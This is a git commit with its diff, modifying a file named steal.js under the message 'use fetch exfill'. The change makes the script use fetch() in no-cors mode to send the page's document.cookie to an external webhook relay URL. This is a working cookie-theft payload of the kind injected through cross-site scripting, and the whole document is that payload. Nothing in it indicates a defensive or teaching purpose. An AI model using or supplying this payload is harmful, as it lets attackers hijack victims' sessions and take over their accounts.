81299a6fc81bd074169a8c0040b7de147da56e92
GoKonggg <kongisinthehouse@gmail.com>
2026-07-14 20:33:03 +0700

    use fetch exfill

--- steal.js
+++ steal.js
@@ -1,3 +1,7 @@
-location =
+fetch(
   "https://bin.webhookrelay.com/v1/webhooks/0e65490e-7f29-48c5-ab1c-517a1b260498?data=" +
-  encodeURIComponent(document.cookie);
+  encodeURIComponent(document.cookie),
+  {
+    mode: "no-cors"
+  }
+);
